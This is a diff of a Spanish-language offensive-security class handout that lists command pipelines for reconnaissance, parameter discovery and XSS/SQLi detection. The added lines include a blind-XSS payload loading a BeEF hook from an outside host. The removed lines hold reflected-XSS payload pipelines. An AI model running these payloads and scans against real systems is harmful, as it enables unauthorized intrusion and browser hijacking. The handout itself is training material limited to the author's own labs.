@@ -1,7 +1,8 @@
 # Comandos — Módulo 3 · Clase 1
 ## Recon Automatizado & Discovery de Vulnerabilidades
 
-> **Target de práctica:** `educacionit.com` (academia de IT — uso educativo/con permiso)
+> **Target de práctica (recon pasivo/externo):** `educacionit.com` (academia de IT — solo pasivo, sin enumeración activa/explotación, ver nota al final)
+> **Target de la Demo 0 en vivo (deck):** `dvwa.labs.manuel-roldan.cloud` (lab propio, autenticado — ver nota de cookie abajo)
 > **Objetivo:** mapear la superficie de ataque, encontrar parámetros y candidatos a XSS/SQLi
 
 ---
@@ -27,15 +28,21 @@ httpx-toolkit -l subdominios.txt -silent -p 80,443,8080 -o vivos.txt
 # URLs históricas desde Wayback Machine, CommonCrawl, OTX, URLScan
 cat vivos.txt | gau --threads 200 --o urls_pasivas.txt
 
-# URLs activas: katana crawlea el sitio en tiempo real, incluyendo JavaScript
+# URLs activas: katana crawlea el sitio en tiempo real, incluyendo JavaScript (-jc)
 katana -u vivos.txt -d 3 -jc -silent -o urls_activas.txt
 
-# Combinar ambas listas sin duplicados exactos
-# anew agrega solo líneas nuevas (no repite)
-cat urls_pasivas.txt urls_activas.txt | anew todas_las_urls.txt
+# Combinar ambas listas (dedup real lo hace uro en la Fase 3, un sort -u alcanza acá)
+cat urls_pasivas.txt urls_activas.txt | sort -u > todas_las_urls.txt
 ```
 
 > 💡 `gau` = pasado (historial), `katana` = presente (crawl en vivo). Usarlos juntos maximiza cobertura.
+
+**Sobre un target con login (ej. DVWA en la Demo 0 del deck):** sin sesión autenticada, `katana` solo ve la página de login. Hay que loguearse primero en el browser, copiar la cookie de sesión, y pasarla con `-H`:
+
+```bash
+katana -u https://dvwa.labs.manuel-roldan.cloud -d 2 \
+  -H "Cookie: security=low; PHPSESSID=<tu_session_id>" -o urls_activas.txt
+```
 
 ---
 
@@ -43,7 +50,7 @@ cat urls_pasivas.txt urls_activas.txt | anew todas_las_urls.txt
 
 ```bash
 # uro elimina URLs que son del mismo patrón (ej: ?id=1, ?id=2, ?id=3 → guarda solo una)
-uro -i todas_las_urls.txt -o urls_limpias.txt
+cat todas_las_urls.txt | uro -o urls_limpias.txt
 ```
 
 > 💡 Sin `uro` podés terminar con miles de URLs que son básicamente la misma. Reduce el set a patrones únicos.
@@ -57,89 +64,101 @@ uro -i todas_las_urls.txt -o urls_limpias.txt
 cat urls_limpias.txt | grep -E "\.js$" >> archivos_js.txt
 
 # jsleak analiza cada JS buscando:
-# -s secrets (API keys, tokens, passwords hardcodeados)
 # -l links (endpoints y rutas internas)
-# -k verifica status code de cada link encontrado
+# -s secrets (API keys, tokens, passwords hardcodeados)
 # -c 150 = 150 workers concurrentes
-cat archivos_js.txt | jsleak -s -l -k -c 150 | tee secretos_js.txt
+cat archivos_js.txt | jsleak -l -s -c 150 | tee secretos_js.txt
 ```
 
 > 💡 Es sorprendente cuántas apps tienen API keys o endpoints internos dentro del JS del frontend.
 
 ---
 
-## 🎯 Fase 5 — Descubrir parámetros ocultos
+## 🎯 Fase 5 — Filtrar por patrón y descubrir parámetros ocultos
 
 ```bash
+# gf aplica patrones grep para clasificar candidatos por tipo de vulnerabilidad
+cat urls_limpias.txt | gf xss  > candidates_xss.txt
+cat urls_limpias.txt | gf sqli > candidates_sqli.txt
+
 # arjun fuzzea cada endpoint buscando parámetros no documentados
-# -m GET,POST  → probar ambos métodos HTTP
-# -t 50        → 50 threads (más = más rápido, cuidado con rate limiting)
-arjun -i urls_limpias.txt -m GET,POST -t 50 -oT parametros_ocultos.txt
+# -i archivo de entrada, --rate-limit cuida no tumbar el target
+arjun -i urls_limpias.txt --rate-limit 10 -o parametros_ocultos.txt
 ```
 
 > 💡 Muchos parámetros vulnerables no aparecen en la URL pública — están ocultos. arjun los descubre por fuerza bruta.
 
 ---
 
-## ⚡ Fase 6 — Detección de XSS
-
-### 6a. kxss — Detectar reflejos de caracteres peligrosos
+## 🧨 Fase 6 — Fuzzing de rutas con ffuf
 
 ```bash
-# gf xss filtra URLs con params típicamente vulnerables a XSS
-# grep -vE excluye dominios que no son el target (evitar ruido)
-# kxss inyecta chars especiales y reporta cuáles se reflejan sin codificar
-cat urls_limpias.txt | gf xss | grep -vE "linkedin|whatsapp" | kxss | tee kxss.txt
+# Directory/file discovery
+ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -fc 404
 ```
 
-> 💡 `kxss` no confirma XSS, detecta *posibilidades*. Un char reflejado sin encodear = candidato a explotar.
-
-### 6b. xsschecker — Confirmar payload reflejado
-
-```bash
-# qsreplace reemplaza el valor de TODOS los params con el payload
-# xsschecker verifica si el payload aparece en la respuesta
-# -vuln = mostrar solo los vulnerables
-cat urls_limpias.txt | gf xss \
-  | qsreplace '"><script>alert(1)</script>' \
-  | xsschecker -match 'alert(1)' -t 100 -vuln
-```
-
-> 💡 Este pipeline va de "miles de URLs" a "URLs con XSS confirmado" en segundos.
-
-### 6c. Guardar candidatos para revisar con Burp/dalfox
-
-```bash
-# Guardar URLs candidatas a XSS para análisis manual o con dalfox
-cat urls_limpias.txt | gf xss | grep -vE "linkedin|whatsapp" >> targetxss.txt
-```
+> 💡 Útil para encontrar rutas que ni `gau` ni `katana` indexaron (nunca enlazadas, nunca crawleadas).
 
 ---
 
-## 🔬 Fase 7 — Scanner de vulnerabilidades con Nuclei
+## ⚡ Fase 7 — Detección de XSS
 
 ```bash
-# nuclei con modo DAST: prueba activamente las URLs
-# -c 30 = 30 templates concurrentes
-# -rl 50 = rate limit de 50 requests/segundo
-cat urls_limpias.txt | nuclei -dast -c 30 -rl 50 -o resultados_nuclei.txt
+# kxss: detecta qué parámetros reflejan caracteres especiales sin sanitizar
+cat candidates_xss.txt | kxss
+
+# Gxss: más preciso para SPAs modernas, valida el contexto JS exacto de la reflexión
+cat candidates_xss.txt | Gxss -p q
+
+# bxss: Blind XSS — para payloads que se ejecutan en paneles admin fuera de tu vista
+cat candidates_xss.txt | bxss \
+  -payload '"><script src=https://beef.labs.manuel-roldan.cloud/hook.js><\/script>' \
+  -parameters
+
+# dalfox: scanner de XSS automatizado, genera y verifica payloads (incluye DOM XSS con headless Chrome)
+dalfox file candidates_xss.txt --blind https://beef.labs.manuel-roldan.cloud/hook.js
 ```
 
-> 💡 Nuclei tiene miles de templates para XSS, SQLi, SSRF, LFI, misconfigs, CVEs, etc. En modo `-dast` usa las URLs como entrada.
+> 💡 `kxss`/`Gxss` detectan reflexión (candidatos). `dalfox` confirma explotación. `bxss` cubre el caso ciego (panel admin que no ves).
 
 ---
 
-## 🔗 Pipeline completo (one-liner)
+## 🔬 Fase 8 — Scanner de vulnerabilidades con Nuclei
 
 ```bash
-# De subdominio a candidatos XSS en un solo comando
-subfinder -d target.com -silent \
-  | httpx-toolkit -silent \
-  | gau --threads 100 \
-  | uro \
-  | gf xss \
-  | qsreplace '"><svg onload=alert(1)>' \
-  | xsschecker -match 'alert(1)' -t 50 -vuln
+# Templates básicos contra la lista completa
+nuclei -l urls_limpias.txt -t exposures/ -t vulnerabilities/ -o resultados_nuclei.txt
+
+# Solo severidad alta/crítica, tags específicos
+nuclei -l urls_limpias.txt -tags xss,sqli -severity medium,high
+```
+
+> 💡 Nuclei tiene miles de templates para XSS, SQLi, SSRF, LFI, misconfigs, CVEs, etc. Rápido pero genera falsos positivos — siempre validar con Burp.
+
+---
+
+## 🔗 Pipeline completo (Demo 0 del deck, contra DVWA)
+
+```bash
+# 1. Crawl autenticado del target
+katana -u https://dvwa.labs.manuel-roldan.cloud -d 2 \
+  -H "Cookie: security=low; PHPSESSID=<tu_session_id>" -o urls.txt
+
+# 2. Deduplicar
+cat urls.txt | uro -o clean.txt
+
+# 3. Filtrar candidatos
+cat clean.txt | gf xss  > xss.txt
+cat clean.txt | gf sqli > sqli.txt
+
+# 4. Detectar reflexión XSS
+cat xss.txt | kxss
+
+# 5. Buscar parámetros ocultos
+arjun -i clean.txt --rate-limit 5 -o params.txt
+
+# 6. Escanear con nuclei
+nuclei -l clean.txt -tags xss,sqli -severity medium,high
 ```
 
 ---
@@ -152,15 +171,22 @@ subfinder -d target.com -silent \
 | `httpx-toolkit` | Probe HTTP (hosts vivos) | `brew install httpx` / `apt install httpx-toolkit` |
 | `gau` | URLs históricas pasivas | `go install github.com/lc/gau/v2/cmd/gau@latest` |
 | `katana` | Crawler activo + JS | `brew install katana` |
-| `anew` | Deduplicar (append único) | `go install github.com/tomnomnom/anew@latest` |
 | `uro` | Deduplicar patrones URL | `pip3 install uro` |
 | `jsleak` | Secretos/links en JS | `go install github.com/byt3hx/jsleak@latest` |
+| `gf` | Filtrar URLs por patrón de vuln | `go install github.com/tomnomnom/gf@latest` |
 | `arjun` | Descubrir params ocultos | `pip3 install arjun` |
-| `gf` | Filtrar URLs por vuln | `go install github.com/tomnomnom/gf@latest` |
+| `ffuf` | Fuzzing de directorios/parámetros | `go install github.com/ffuf/ffuf/v2@latest` |
 | `kxss` | Detectar reflejos XSS | `go install github.com/Emoe/kxss@latest` |
-| `qsreplace` | Inyectar payloads en params | `go install github.com/tomnomnom/qsreplace@latest` |
-| `xsschecker` | Confirmar XSS reflejado | `go install github.com/rix4uni/xsschecker@latest` |
-| `nuclei` | Scanner de vulns | `brew install nuclei` |
+| `Gxss` | Reflexión XSS en contexto JS (SPAs) | `go install github.com/KathanP19/Gxss@latest` |
+| `bxss` | Blind XSS (paneles fuera de vista) | `go install github.com/ethicalhackingplayground/bxss/v2/cmd/bxss@latest` |
+| `dalfox` | Scanner XSS automatizado + DOM | `go install github.com/hahwul/dalfox/v2@latest` |
+| `nuclei` | Scanner de vulns por templates | `brew install nuclei` |
 
 > 📦 **Patrones GF:** https://github.com/d4rkrex/GF-patterns
 > Clonar en `~/.gf/` para que `gf xss`, `gf sqli`, etc. funcionen.
+
+---
+
+## Nota sobre `educacionit.com`
+
+Solo reconocimiento **pasivo** (subfinder, gau — fuentes públicas, sin tocar el target directamente). No correr `httpx-toolkit` activo, `katana`, `ffuf`, `arjun`, `nuclei` ni cualquier fuzzing/explotación contra ese dominio sin autorización explícita del instituto. El pipeline completo activo (Fases 2 en adelante con katana, Fase 6-8) es solo contra labs propios (`*.labs.manuel-roldan.cloud`).
